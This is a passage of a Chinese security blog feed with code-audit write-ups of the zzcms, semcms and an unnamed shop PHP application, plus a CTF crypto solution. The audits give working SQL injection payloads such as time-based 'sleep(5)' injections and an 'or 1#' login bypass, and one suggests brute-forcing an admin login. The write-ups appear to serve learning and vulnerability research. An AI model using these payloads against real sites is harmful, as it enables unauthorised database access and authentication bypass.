src="/2021/10/19/zzcms%E7%9A%84%E5%86%8D%E4%B8%80%E6%AC%A1%E5%AE%A1%E8%AE%A1/44.png" alt="44"></p><blockquote><p>这个函数在conn.php里面 而conn.php还包含了其他文件</p></blockquote><p><img src="/2021/10/19/zzcms%E7%9A%84%E5%86%8D%E4%B8%80%E6%AC%A1%E5%AE%A1%E8%AE%A1/45.png" alt="45"></p><blockquote><p>注意到stopsqlin.php 打开这个文件看看</p></blockquote><p><img src="/2021/10/19/zzcms%E7%9A%84%E5%86%8D%E4%B8%80%E6%AC%A1%E5%AE%A1%E8%AE%A1/46.png" alt="46"></p><blockquote><p>这个文件主要是过滤的<br>addslashes() 函数返回在预定义字符之前添加反斜杠的字符串。<br>htmlspecialchars() 函数把预定义的字符转换为 HTML 实体。<br>相当于这里单引号双引号都过滤了<br>但是 有个地方没有引号保护 直接尝试payload：</p></blockquote><p><img src="/2021/10/19/zzcms%E7%9A%84%E5%86%8D%E4%B8%80%E6%AC%A1%E5%AE%A1%E8%AE%A1/47.png" alt="47"></p><blockquote><p>点击删除 然后抓包</p></blockquote><p><img src="/2021/10/19/zzcms%E7%9A%84%E5%86%8D%E4%B8%80%E6%AC%A1%E5%AE%A1%E8%AE%A1/48.png" alt="48"></p><blockquote><p>构造payload：id[]=1,1)+or sleep(5)#&amp;del=%E5%88%A0%E9%99%A4%E9%80%89%E4%B8%AD%E7%9A%84%E4%BF%A1%E6%81%AF&amp;pagename=showbad.php%3Fpage%3D&amp;tablename=zzcms_bad</p></blockquote><p><img src="/2021/10/19/zzcms%E7%9A%84%E5%86%8D%E4%B8%80%E6%AC%A1%E5%AE%A1%E8%AE%A1/49.png" alt="49"></p><blockquote><p>成功延时</p></blockquote><blockquote><p>但是这个sql也是要登录后台的</p></blockquote><h3 id="第五处sql"><a href="#第五处sql" class="headerlink" title="第五处sql"></a>第五处sql</h3><blockquote><p>因为前面的sql需要登录后台 所以想找个不需要登录的<br>前面找到没有引号保护的sql 这个cms肯定不止一个地方 全局搜索</p></blockquote><p><img src="/2021/10/19/zzcms%E7%9A%84%E5%86%8D%E4%B8%80%E6%AC%A1%E5%AE%A1%E8%AE%A1/50.png" alt="50"></p><blockquote><p>在dl/dl_print.php 文件下找到</p></blockquote><p><img src="/2021/10/19/zzcms%E7%9A%84%E5%86%8D%E4%B8%80%E6%AC%A1%E5%AE%A1%E8%AE%A1/51.png" alt="51"></p><blockquote><p>这个文件在开始也没有检验是否登录 所以有戏 接着分析源码</p></blockquote><p><img src="/2021/10/19/zzcms%E7%9A%84%E5%86%8D%E4%B8%80%E6%AC%A1%E5%AE%A1%E8%AE%A1/52.png" alt="52"></p><blockquote><p>通过cookie是否有username 来判断是否执行OpenAndDataFunc这个函数 这个函数是弹出登录框的</p></blockquote><blockquote><p>往后看</p></blockquote><p><img src="/2021/10/19/zzcms%E7%9A%84%E5%86%8D%E4%B8%80%E6%AC%A1%E5%AE%A1%E8%AE%A1/53.png" alt="53"></p><blockquote><p>id还是通过post传入</p></blockquote><p><img src="/2021/10/19/zzcms%E7%9A%84%E5%86%8D%E4%B8%80%E6%AC%A1%E5%AE%A1%E8%AE%A1/54.png" alt="54"></p><blockquote><p>这里有个权限的判断 我们跟进这个函数</p></blockquote><p><img src="/2021/10/19/zzcms%E7%9A%84%E5%86%8D%E4%B8%80%E6%AC%A1%E5%AE%A1%E8%AE%A1/55.png" alt="55"></p><blockquote><p>这个函数是判断cookie中的uesname是否在zzcms_user表中 有则返回yes<br>这里这个username 是可以通过枚举来判断这个表里有哪一些</p></blockquote><p><img src="/2021/10/19/zzcms%E7%9A%84%E5%86%8D%E4%B8%80%E6%AC%A1%E5%AE%A1%E8%AE%A1/56.png" alt="56"></p><blockquote><p>然后就看到这里 和前面的差不多 但这里两个sql语句都没有引号保护 说明 都可以达到注入<br>尝试测试</p></blockquote><blockquote><p>先打开dl/dl_print.php 页面</p></blockquote><p><img src="/2021/10/19/zzcms%E7%9A%84%E5%86%8D%E4%B8%80%E6%AC%A1%E5%AE%A1%E8%AE%A1/57.png" alt="57"></p><blockquote><p>然后刷新抓包</p></blockquote><p><img src="/2021/10/19/zzcms%E7%9A%84%E5%86%8D%E4%B8%80%E6%AC%A1%E5%AE%A1%E8%AE%A1/58.png" alt="58"></p><blockquote><p>然后右键改包 构造payload：id[]=2+or sleep(5)#</p></blockquote><p><img src="/2021/10/19/zzcms%E7%9A%84%E5%86%8D%E4%B8%80%E6%AC%A1%E5%AE%A1%E8%AE%A1/59.png" alt="59"></p><blockquote><p>还有一种</p></blockquote><p><img src="/2021/10/19/zzcms%E7%9A%84%E5%86%8D%E4%B8%80%E6%AC%A1%E5%AE%A1%E8%AE%A1/60.png" alt="60"></p><blockquote><p>都可以延时</p></blockquote>]]></content>
    
    
    <categories>
      
      <category>代码审计</category>
      
    </categories>
    
    
    <tags>
      
      <tag>web</tag>
      
      <tag>PHP</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>semcms审计</title>
    <link href="/2021/10/19/semcms%E5%AE%A1%E8%AE%A1/"/>
    <url>/2021/10/19/semcms%E5%AE%A1%E8%AE%A1/</url>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><blockquote><p>刚开始学审计 也是看了社区们师傅的文章<a href="https://forum.butian.net/share/387">https://forum.butian.net/share/387</a><br>可能是自己太菜了 感觉不太详细 就自己审了一下</p></blockquote><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><blockquote><p>先打开cms 简单浏览一下</p></blockquote><h2 id><a href="#" class="headerlink" title></a><img src="/2021/10/19/semcms%E5%AE%A1%E8%AE%A1/0.png" alt="0"></h2><blockquote><p><em>看起来视乎是个商城一样的网站 不管随便点点 然后来到代码</em></p></blockquote><h3 id="第一处"><a href="#第一处" class="headerlink" title="第一处"></a>第一处</h3><blockquote><p>然后看到index.php文件，发现里面用include_once 包含了3个文件</p></blockquote><blockquote><p><em>include_once() 语句是指在脚本执行期间包含并运行指定文件。</em><br><em>此行为和 include() 语句类似，唯一区别是如果该文件中的代码已经被包含了，则不会再次包含。如同此语句名字暗示的那样，只会包含一次</em></p></blockquote><p><img src="/2021/10/19/semcms%E5%AE%A1%E8%AE%A1/1.png" alt="1"></p><blockquote><p><strong>然后打开web_inc.php 看看这个文件里面有什么</strong></p></blockquote><p><img src="/2021/10/19/semcms%E5%AE%A1%E8%AE%A1/2.png" alt="2"></p><blockquote><p>这个文件开始是一个ob_start() 函数<br>因为第一次审 所以不懂什么意思 百度了一下发现是打开缓冲区<br>但这里暂时不管它 这个文件里面也用到了include_once 函数包含了2个文件 但暂时都不管<br>继续往下看<br>在53行的时候发现了一串代码</p></blockquote><p><img src="/2021/10/19/semcms%E5%AE%A1%E8%AE%A1/3.png" alt="3"></p><blockquote><p><em>$web_urls接收了$_SERVER[“REQUEST_URI”]值然后通过explode函数分割后传入web_language_ml函数中</em><br><em>$_SERVER[“REQUEST_URI”]函数是返回当前的url路径 我们通过</em><br><em>var_dump来查看返回值</em></p></blockquote><p><img src="/2021/10/19/semcms%E5%AE%A1%E8%AE%A1/4.png" alt="4"></p><blockquote><p>保存之后来到index.php文件下查看</p></blockquote><p><img src="/2021/10/19/semcms%E5%AE%A1%E8%AE%A1/5.png" alt="5"></p><blockquote><p>explode(separator,string,limit)函数是把获取到的url路径通过 / 分割为数组，第一个参数是根据什么进行分割，第二个参数是需要分割的字符串</p></blockquote><p><img src="/2021/10/19/semcms%E5%AE%A1%E8%AE%A1/6.png" alt="6"></p><blockquote><p>然后看下面的web_language_ml函数 通过将$web_urls中的[1]<a href="https://forum.butian.net/share/%E5%9B%A0%E4%B8%BA%E8%BF%99%E4%B8%AA%E6%97%B6%E5%80%99web_urls%E4%BB%A5%E5%8F%8A%E8%A2%AB%E5%88%86%E5%89%B2%E4%B8%BA%E6%95%B0%E7%BB%84%E4%BA%86">2</a> 传到了函数中 以及$db-conn<br>$db-conn则是最开是include_once 包含进来的数据库连接对象</p></blockquote><p><img src="/2021/10/19/semcms%E5%AE%A1%E8%AE%A1/7.png" alt="7"></p><p><img src="/2021/10/19/semcms%E5%AE%A1%E8%AE%A1/8.png" alt="8"></p><blockquote><p>继续跟进web_language_ml函数</p></blockquote><p><img src="/2021/10/19/semcms%E5%AE%A1%E8%AE%A1/9.png" alt="9"></p><blockquote><p>发现该函数没有任何的过滤操作 直接就把传过来的值 进行了数据库查询操作 很明显存在sql注入 根据代码发现是单引号闭合 直接注就行了</p></blockquote><p><img src="/2021/10/19/semcms%E5%AE%A1%E8%AE%A1/10.png" alt="10"></p><blockquote><p>这个洞有个前提 就是文件必须解压在根目录下才行 如果套了一层目录的话 就不能成功</p></blockquote><p><img src="/2021/10/19/semcms%E5%AE%A1%E8%AE%A1/11.png" alt="11"></p><blockquote><p>因为分割后的数组内容就变了 添加其他的内容就没用了</p></blockquote><h3 id="第二处"><a href="#第二处" class="headerlink" title="第二处"></a>第二处</h3><blockquote><p>后面发现在后台登录的时候会经过SEMCMS_Top_include.php 判断<br>然后跟进文件</p></blockquote><p><img src="/2021/10/19/semcms%E5%AE%A1%E8%AE%A1/12.png" alt="12"></p><p><img src="/2021/10/19/semcms%E5%AE%A1%E8%AE%A1/13.png" alt="13"></p><blockquote><p>发现有一个checkuser函数 从函数的命名上就可以看出 肯定和登录相关 然后跟进checkuser()函数</p></blockquote><p><img src="/2021/10/19/semcms%E5%AE%A1%E8%AE%A1/14.png" alt="14"></p><blockquote><p>发现是通过cookie传值的方法 然后进行数据库查询 判断用户是否登录<br>这里还有两个函数test_input(),和verify_str()函数<br>不知道这两函数的作用 大概猜测是过滤<br>然后跟进函数</p></blockquote><p><img src="/2021/10/19/semcms%E5%AE%A1%E8%AE%A1/15.png" alt="15"></p><blockquote><p>Test_input函数接收数据，然后通过str_replace函数将结束数据中的% 替换为percent<br>然后通过trim函数去掉首位的空格，stripslashes函数删去数据中的反斜杠(只去掉一个反斜杠)，htmlspecialchars() 函数把双引号和单引号转为 HTML 实体。 然后返回过滤之后的数据<br>跟进verify_str函数</p></blockquote><p><img src="/2021/10/19/semcms%E5%AE%A1%E8%AE%A1/16.png" alt="16"></p><blockquote><p>verify_str()函数接受参数然后利用if判断 将参数传给inject_check_sql函数<br>继续跟进inject_check_sql函数</p></blockquote><p><img src="/2021/10/19/semcms%E5%AE%A1%E8%AE%A1/17.png" alt="17"></p><blockquote><p>inject_check_sql函数接受参数 然后通过 正则匹配 ，返回 pattern 的匹配次数。 它的值将是 0 次（不匹配）或 1 次，<br>如果匹配到了就会返回1就会进去前面的if判断 执行报错<br>所以还是过滤了很多相关的关键词 这里没有规定大小写 所以可以用大小写绕过<br>然后尝试绕过payload：</p><p><em>scuseradmin:aaa/</em><br><em>scuserpass:or 1#</em></p></blockquote><blockquote><p>然后放到sql执行的语句就是</p></blockquote><p><img src="/2021/10/19/semcms%E5%AE%A1%E8%AE%A1/18.png" alt="18"></p><p><img src="/2021/10/19/semcms%E5%AE%A1%E8%AE%A1/19.png" alt="19"></p><blockquote><p>能查出数据 所以函数执行返回的行数是大于0的，所以就会进去if判断</p></blockquote><p><img src="/2021/10/19/semcms%E5%AE%A1%E8%AE%A1/20.png" alt="20"></p><blockquote><p>然后利用mysqli_fetch_assoc函数接收结果 并把user_qx返回<br>然后验证 但是发现了bug 不知道是本地环境还是怎么回事 就是进不去页面 但是没报错</p></blockquote><p><img src="/2021/10/19/semcms%E5%AE%A1%E8%AE%A1/21.png" alt="21"></p><blockquote><p>然后我换成延时试试</p></blockquote><p><img src="/2021/10/19/semcms%E5%AE%A1%E8%AE%A1/22.png" alt="22"></p><blockquote><p>延时sql是成功执行的 上面第一次没进去 就很奇怪 讲道理这里应该是能绕过登录直接进去才对 我就是进不去</p></blockquote><h3 id="第三处"><a href="#第三处" class="headerlink" title="第三处"></a>第三处</h3><blockquote><p>在web_inc.php的91行发现了一个sql查询语句 发现了一个language参数 是传过来的<br>跟进看看 怎么来的</p></blockquote><p><img src="/2021/10/19/semcms%E5%AE%A1%E8%AE%A1/23.png" alt="23"></p><p><img src="/2021/10/19/semcms%E5%AE%A1%E8%AE%A1/24.png" alt="24"></p><blockquote><p>前面太多花里胡哨的 就先不看 直接看if if里面的意思是 如果存在post的传参languageID的话 就进去if判断 然后进行过滤返回 过滤函数和前面一样 那就看前面就好了<br>然后写上echo 进行调试看看 因为很多页面都引用了web_inc.php这个文件 就不一一查找了 直接先访问首页看看 好家伙 直接打印了</p></blockquote><p><img src="/2021/10/19/semcms%E5%AE%A1%E8%AE%A1/25.png" alt="25"></p><blockquote><p>好 接下来试试post 用bp抓包 这里有个小问题 因为搭建在本地的 如果url是127.0.0.1会抓不到包 我的解决方式是把127.0.0.1 换成ipv4的值 然后就可以抓包了<br>然后来到主页 刷新抓包 然后用bp改包</p></blockquote><p><img src="/2021/10/19/semcms%E5%AE%A1%E8%AE%A1/26.png" alt="26"></p><blockquote><p>点击就改成post包，然后在下面加上languageID 然后放包</p></blockquote><p><img src="/2021/10/19/semcms%E5%AE%A1%E8%AE%A1/27.png" alt="27"></p><blockquote><p>开始注入</p></blockquote><p><img src="/2021/10/19/semcms%E5%AE%A1%E8%AE%A1/28.png" alt="28"></p><blockquote><p>成功延时<br>继续看其他的</p></blockquote><h3 id="第四处"><a href="#第四处" class="headerlink" title="第四处"></a>第四处</h3><blockquote><p>在SEMCMS_Banner.php发现了sql语句<br>在SEMCMS_Banner.php的74行 这行sql语句没用任何参数过滤</p></blockquote><p><img src="/2021/10/19/semcms%E5%AE%A1%E8%AE%A1/29.png" alt="29"></p><blockquote><p>然后上面的代码逻辑是判断type</p></blockquote><p><img src="/2021/10/19/semcms%E5%AE%A1%E8%AE%A1/30.png" alt="30"></p><blockquote><p>先判断add和edit 然后才else进到下面</p></blockquote><p><img src="/2021/10/19/semcms%E5%AE%A1%E8%AE%A1/31.png" alt="31"></p><blockquote><p>因为这里没看见上面过滤 就直接构造payload：</p><p><em>/SEMCMS_PHP_3.9/vyT4nP_Admin/SEMCMS_Banner.php?lgid=1+and+sleep(5)#</em></p></blockquote><p><img src="/2021/10/19/semcms%E5%AE%A1%E8%AE%A1/32.png" alt="32"></p><blockquote><p>延时成功<br>但是在尝试select的时候却出现了问题</p></blockquote><p><img src="/2021/10/19/semcms%E5%AE%A1%E8%AE%A1/33.png" alt="33"></p><blockquote><p>直接报错了 这个报错信息是前面解释过的过滤函数中的一个 但是这里没有看见使用该函数进行过滤呀 这里有点懵 这个文件虽然包含了</p></blockquote><p><img src="/2021/10/19/semcms%E5%AE%A1%E8%AE%A1/34.png" alt="34"></p><blockquote><p>这个php文件是用来判断是否登录的 因为前面发现可以通过sql 绕过登录 使用banner.php也是直接进来了 但是过滤我真没找到 应该是我太菜了 毕竟都报错了<br>那就只能通过大小写登方式来绕过过滤 但是当我尝试的时候 发现不行 windows不区分大小写 难道是因为这样嘛 有点小懵 看来还是只能通过其他的方式注入 用其他的替换过滤掉的关键词<br>这处注入是简历在第二处注入绕过登录的前提下 因为这个页面相当于是后台的页面</p></blockquote><h3 id="第五处"><a href="#第五处" class="headerlink" title="第五处"></a>第五处</h3><blockquote><p>其实这处也不算啥 登录出可以爆破 因为没有验证码的限制 可以直接跑字典<br>直接来到后台页面</p></blockquote><p><img src="/2021/10/19/semcms%E5%AE%A1%E8%AE%A1/35.png" alt="35"></p><blockquote><p>然后抓到包直接丢爆破模块里面</p></blockquote><p><img src="/2021/10/19/semcms%E5%AE%A1%E8%AE%A1/36.png" alt="36"></p><blockquote><p>就可以开始爆破了</p></blockquote><p><img src="/2021/10/19/semcms%E5%AE%A1%E8%AE%A1/37.png" alt="37"></p><h3 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h3><blockquote><p>小白第一次审计 还有很多不会 也看了很多文章 查了很多函数 师傅们轻点喷 有什么不足的地方提个建议 我学习学习 这cms还在看 感觉应该还有洞 虽然没能找到直接拿shell的洞 通过这些 也学到了不少审计的思路</p></blockquote>]]></content>
    
    
    <categories>
      
      <category>代码审计</category>
      
    </categories>
    
    
    <tags>
      
      <tag>web</tag>
      
      <tag>PHP</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ctf-crypto1</title>
    <link href="/2021/09/26/ctf-crypto1/"/>
    <url>/2021/09/26/ctf-crypto1/</url>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>一次巧合的情况下点开了一个ctf比赛 一直没玩过ctf 第一次  0基础分析 签到题<br>crypto的</p><h3 id="题目："><a href="#题目：" class="headerlink" title="题目："></a>题目：</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python</span><br><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> random<br>flag=<span class="hljs-string">b&#x27;flag&#123;******************&#125;&#x27;</span><br>n = <span class="hljs-number">2</span> ** <span class="hljs-number">256</span><br>flaglong=bytes_to_long(flag)<br>m = random.randint(<span class="hljs-number">2</span>, n-<span class="hljs-number">1</span>) | <span class="hljs-number">1</span><br>c = <span class="hljs-built_in">pow</span>(m, flaglong, n)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;m = &#x27;</span> + <span class="hljs-built_in">str</span>(m))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;c = &#x27;</span> + <span class="hljs-built_in">str</span>(c))<br><br><span class="hljs-comment"># m = 73964803637492582853353338913523546944627084372081477892312545091623069227301</span><br><span class="hljs-comment"># c = 21572244511100216966799370397791432119463715616349800194229377843045443048821</span><br></code></pre></td></tr></table></figure><blockquote><p>开始啥都不会<br>先通过找师傅帮忙 给出了 解密的脚本</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python">m = <span class="hljs-number">73964803637492582853353338913523546944627084372081477892312545091623069227301</span><br>c = <span class="hljs-number">21572244511100216966799370397791432119463715616349800194229377843045443048821</span><br>n = <span class="hljs-number">2</span> ** <span class="hljs-number">256</span><br><span class="hljs-keyword">import</span> sympy<br>flag=sympy.discrete_log(n,c,m)<br><span class="hljs-built_in">print</span>(flag)<br><span class="hljs-keyword">import</span> binascii<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(flag))<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(flag)[<span class="hljs-number">2</span>:])<br><span class="hljs-built_in">print</span>(binascii.unhexlify(<span class="hljs-built_in">hex</span>(flag)[<span class="hljs-number">2</span>:]))<span class="hljs-comment">#将答案的十六进制转出来就行</span><br><span class="hljs-built_in">print</span>(binascii.hexlify(<span class="hljs-string">b&#x27;flag&#123;DASCTF_zjut&#125;&#x27;</span>))<br></code></pre></td></tr></table></figure><p><strong>运行结果</strong><br><img src="https://img-blog.csdnimg.cn/7b575ce40d2f4078b67d85f21c9d917b.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA6Zu26Zu25p-SYw==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p><blockquote><p>先分析题目</p></blockquote><blockquote><p>主要的地方在</p></blockquote><blockquote><p>c = pow(m, flaglong, n) 这一段代码<br>这段代码可以看出只有flaglong是我们不知道的<br>所以就需要反解出flaglong<br>c = pow(x,y,z)：这个是表示x的y次幂后除以z的余数。<br>所以要求y  就相当于求flaglong<br>根据师傅的帮助  这道题就可以转化为</p></blockquote><p><img src="https://img-blog.csdnimg.cn/620b24eab6f1472585520d8e04193dfc.png" alt="在这里插入图片描述"></p><blockquote><p>求满足m的flag次方等于c对模n取同余<br>“≡”是数论中表示同余的符号<br><strong>discrete_log</strong>这个函数就是用来求这种类型的<br>discrete_log(x,y,z),x是模数，y是余数，z是底数<br>sympy.discrete_log(n,c,m) 就相对于上面的c = pow(m, flaglong, n)<br>c是余数 m是底数 n是模数</p></blockquote><blockquote><p>**flag=sympy.discrete_log(n,c,m)**这样解出来的flag就是flaglong 是十进制数 因为开始是通过bytes_to_long函数转化的  所以要转化为字符</p></blockquote><blockquote><p>十进制转化为字符  要先转化为16进制  然后转化为字符<br>所以用hex先转化为16进制   然后截取掉 进制标志位<br>然后在通过binascii.unhexlify()函数转化为字符  </p></blockquote><blockquote><p>也可通过在线的进制转化</p><p><img src="https://img-blog.csdnimg.cn/3d0971c9e4f84f2b8560270026f42021.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA6Zu26Zu25p-SYw==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p></blockquote><p><img src="https://img-blog.csdnimg.cn/662ce69503f54e25b8c6dbf5918872cf.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA6Zu26Zu25p-SYw==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p><blockquote><p>最后也可以通过Crypto 库的另一个函数直接转化flag字符</p></blockquote><p><img src="https://img-blog.csdnimg.cn/be66a0bf3bbb4eee8c7a7c3c162e2f3f.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA6Zu26Zu25p-SYw==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p><blockquote><p>但是这里我本地不知道什么原因用不起Crypto  就没有在本地复现了</p></blockquote><p>成功解出flag</p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>某商城代码审计</title>
    <link href="/2021/09/04/%E6%9F%90%E5%95%86%E5%9F%8E%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    <url>/2021/09/04/%E6%9F%90%E5%95%86%E5%9F%8E%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/</url>
    
    <content type="html"><![CDATA[<h2 id="审计开始"><a href="#审计开始" class="headerlink" title="审计开始"></a>审计开始</h2><h3 id="第一处"><a href="#第一处" class="headerlink" title="第一处"></a>第一处</h3><blockquote><p>先来到admin.php页面 先不登录</p></blockquote><p><img src="/2021/09/04/%E6%9F%90%E5%95%86%E5%9F%8E%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/1.png" alt="1"></p><blockquote><p>查看源码</p></blockquote><p><img src="/2021/09/04/%E6%9F%90%E5%95%86%E5%9F%8E%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/2.png" alt="2"></p><blockquote><p>admin.php 页面require()引入了一个common.php页面<br>require()是php的内置函数，作用是引入或者包含外部php文件。<br>工作原理：当本身php文件被执行时，则外部文件的内容就将被包含进该自身php文件中；当包含的外部文件发生错误时，系统将抛出错误提示，并且停止php文件的执行。<br>注意：使用require时，一个文件存在错误的话，那么程序就会中断执行了，并显示致命错误 。<br>然后接着往后面看</p></blockquote><p><img src="/2021/09/04/%E6%9F%90%E5%95%86%E5%9F%8E%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/3.png" alt="3"></p><blockquote><p>这里发现一个sql语句 看起来是没有什么防护的 可能有突破 忘前面看 寻找$m</p></blockquote><p><img src="/2021/09/04/%E6%9F%90%E5%95%86%E5%9F%8E%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/4.png" alt="4"></p><blockquote><p>在28行和29行发现$m 有两种发送赋值 一种是通过file_get_contents函数 另一种是 如果$m是空的话 就自动赋默认值 默认值没什么看的 我们不能控制 我们看看这个file_get_contents函数<br>file_get_contents() 函数把整个文件读入一个字符串中。<br>然后在file_get_contents函数内部发现了php://input 输入流<br>php://input可以读取没有处理过的POST数据<br>所以这里就导致了 post数据可控<br>然后继续往下看</p></blockquote><p><img src="/2021/09/04/%E6%9F%90%E5%95%86%E5%9F%8E%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/5.png" alt="5"></p><blockquote><p>$m会调用一个Dec函数 我们跟进这个函数</p></blockquote><p><img src="/2021/09/04/%E6%9F%90%E5%95%86%E5%9F%8E%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/6.png" alt="6"></p><blockquote><p>这个函数使用了json_decode函数 json_decode — 对 JSON 格式的字符串进行编码</p></blockquote><p><img src="/2021/09/04/%E6%9F%90%E5%95%86%E5%9F%8E%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/7.png" alt="7"></p><blockquote><p>说明 输入流传入的数据需要json格式 然后继续往后看 return会判断$c的值 false的话 就直接把解码后的json数据返回出去 但是前面代码调用的时候传入的true 所以会返回一个函数Rpl 继续跟进这个函数</p></blockquote><p><img src="/2021/09/04/%E6%9F%90%E5%95%86%E5%9F%8E%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/8.png" alt="8"></p><blockquote><p>这个函数用到了foreach is_array is_string 等函数<br>Foreach函数是用来遍历数组的</p></blockquote><p><img src="/2021/09/04/%E6%9F%90%E5%95%86%E5%9F%8E%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/9.png" alt="9"></p><blockquote><p>Is_array函数是判断变量是否为数组<br>Is_string 同理 判断是否为字符串</p></blockquote><blockquote><p>所以这个函数的大概意思就是 将解码后的json数据 通过foreach遍历为键值的形式 值为数组的话则递归调用 判断是否为数组 直到为字符串 才进入下一个判断 在下一个elseif里面 这通过str_replace 进行过滤 经过ascii码值 过滤掉 / * ‘ “ % 空格 然后返回过滤后的数据</p></blockquote><p><img src="/2021/09/04/%E6%9F%90%E5%95%86%E5%9F%8E%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/10.png" alt="10"></p><blockquote><p>然后回到admin.php页面 32行 判断$m[‘act’]的值是否为idx和lgn 因为用的&amp;&amp; 所以只要同时不等于两个 就会进入if 执行sql 又因为前面过滤掉的字符对sql语句影响不大 直接构造语句</p></blockquote><p><img src="/2021/09/04/%E6%9F%90%E5%95%86%E5%9F%8E%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/11.png" alt="11"></p><blockquote><p>来到admin.php页面然后刷新抓包</p></blockquote><p><img src="/2021/09/04/%E6%9F%90%E5%95%86%E5%9F%8E%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/12.png" alt="12"></p><blockquote><p>然后改变请求方式</p></blockquote><p><img src="/2021/09/04/%E6%9F%90%E5%95%86%E5%9F%8E%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/13.png" alt="13"></p><blockquote><p>构造</p><p><em>payload: {“act”:”ttt”,”uid”:”123||sleep(5)”} 延时5秒</em><br><em>因为没有回显位 尝试盲注</em></p></blockquote><p><img src="/2021/09/04/%E6%9F%90%E5%95%86%E5%9F%8E%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/14.png" alt="14"></p><blockquote><p>也是可以的 后面盲注就不继续测试了</p></blockquote><h3 id="第二处"><a href="#第二处" class="headerlink" title="第二处"></a>第二处</h3><blockquote><p>通过审计工具发现一处可能存在注入的地方</p></blockquote><p><img src="/2021/09/04/%E6%9F%90%E5%95%86%E5%9F%8E%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/15.png" alt="15"></p><blockquote><p>然后跟进</p></blockquote><p><img src="/2021/09/04/%E6%9F%90%E5%95%86%E5%9F%8E%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/16.png" alt="16"></p><blockquote><p>发现是在会员保存的地方 属于需要进入后台<br>我们先登入后台 来到会员保存的地方</p></blockquote><p><img src="/2021/09/04/%E6%9F%90%E5%95%86%E5%9F%8E%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/17.png" alt="17"></p><blockquote><p>然后点击保存抓包</p></blockquote><p><img src="/2021/09/04/%E6%9F%90%E5%95%86%E5%9F%8E%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/18.png" alt="18"></p><blockquote><p>然后通过代码分析</p></blockquote><p><img src="/2021/09/04/%E6%9F%90%E5%95%86%E5%9F%8E%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/19.png" alt="19"></p><blockquote><p>要$m[‘ID’]的值乘1不为0 才会进入else 所以进行改包</p></blockquote><p><img src="/2021/09/04/%E6%9F%90%E5%95%86%E5%9F%8E%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/20.png" alt="20"></p><blockquote><p>下面这个if是通过$m[‘Nm’]判断名字是否重复 如果重复的话就终止后续执行了 所以名字随便也改一下<br>然后来到第二个if 里面有sql语句</p></blockquote><p><img src="/2021/09/04/%E6%9F%90%E5%95%86%E5%9F%8E%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/21.png" alt="21"></p><blockquote><p>只看到这个ID这个位置 后面先不看 这里没有过滤 等操作 也没有单引号 